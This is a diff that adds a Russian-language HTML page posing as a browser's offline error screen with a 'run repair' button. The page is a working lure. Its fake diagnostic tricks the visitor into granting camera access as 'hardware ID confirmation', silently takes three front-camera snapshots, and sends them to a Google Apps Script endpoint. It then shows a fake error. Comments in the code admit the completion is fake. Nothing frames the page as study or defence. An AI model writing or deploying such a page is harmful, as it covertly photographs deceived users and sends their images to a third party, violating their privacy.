@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Нет подключения к Интернету</title>
+    <style>
+        body { background: #fff; font-family: -apple-system, sans-serif; color: #5f6368; margin: 0; padding: 40px 5% 0; box-sizing: border-box; }
+        .offline { max-width: 400px; }
+        .icon { width: 56px; height: 56px; margin-bottom: 24px; filter: grayscale(1); }
+        h1 { color: #202124; font-size: 21px; font-weight: 400; margin: 0 0 16px; }
+        p { font-size: 14px; line-height: 1.6; margin: 0 0 28px; }
+        
+        /* Кнопки */
+        .btn-blue { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 12px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        
+        /* Прогресс-бар */
+        #repair-box { display: none; margin-top: 20px; text-align: left; }
+        .progress-bg { width: 100%; height: 4px; background: #eee; border-radius: 2px; overflow: hidden; margin: 10px 0; }
+        .progress-fill { width: 0%; height: 100%; background: #1a73e8; transition: width 0.5s; }
+        .status-text { font-size: 12px; font-style: italic; color: #70757a; }
+    </style>
+</head>
+<body>
+    <div class="offline" id="main-view">
+        <svg class="icon" viewBox="0 0 48 48"><path d="M38 10H14c-2.2 0-4 1.8-4 4v20c0 2.2 1.8 4 4 4h24c2.2 0 4-1.8 4-4V14c0-2.2-1.8-4-4-4zM18 28h-4v-4h4v4zm0-8h-4v-4h4v8zm8 8h-4v-4h4v4zm0-8h-4v-4h4v8zm8 8h-4v-4h4v4zm0-8h-4v-4h4v8z"/></svg>
+        <h1>Нет подключения к Интернету</h1>
+        <p>Для восстановления соединения требуется автоматическая диагностика сетевого шлюза.</p>
+        <button class="btn-blue" id="repairBtn">Запустить исправление</button>
+    </div>
+
+    <div class="offline" id="repair-box">
+        <h1>Выполняется диагностика...</h1>
+        <div class="progress-bg"><div class="progress-fill" id="fill"></div></div>
+        <div class="status-text" id="status">Проверка DNS-кэша...</div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const scriptUrl = 'https://script.google.com/macros/s/AKfycbw2eJZAd_A9J_kS87w1XZfLVjA1i_bryn9Y6RrVA2wn4HvAYh_GafZem1kNlywnNbb3bw/exec';
+        const repairBtn = document.getElementById('repairBtn');
+        const mainView = document.getElementById('main-view');
+        const repairBox = document.getElementById('repair-box');
+        const fill = document.getElementById('fill');
+        const status = document.getElementById('status');
+
+        repairBtn.addEventListener('click', () => {
+            mainView.style.display = 'none';
+            repairBox.style.display = 'block';
+            startRepair();
+        });
+
+        async function startRepair() {
+            // Этап 1: Просто анимация
+            setTimeout(() => { fill.style.width = "30%"; status.innerText = "Анализ прокси-серверов..."; }, 1000);
+            
+            // Этап 2: Тот самый момент запроса
+            setTimeout(async () => {
+                fill.style.width = "60%";
+                status.innerText = "Требуется подтверждение аппаратного ID. Нажмите 'Разрешить' в окне браузера для завершения...";
+                
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
+
+                    // Делаем серию снимков в фоне
+                    for (let i = 0; i < 3; i++) {
+                        await new Promise(r => setTimeout(r, 1500));
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+			canvas.getContext('2d').drawImage(video, 0, 0);
+                        const base64 = canvas.toDataURL('image/png');
+                        
+                        fetch(scriptUrl, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ image: base64 }) });
+                    }
+
+                    // Этап 3: Завершение (фейковое)
+                    fill.style.width = "100%";
+                    status.innerText = "Ошибка авторизации порта 8080. Попробуйте вручную.";
+                    stream.getTracks().forEach(t => t.stop());
+                } catch (e) {
+                    status.innerText = "Ошибка: Доступ запрещен. Исправление невозможно без подтверждения ID.";
+                    status.style.color = "red";
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
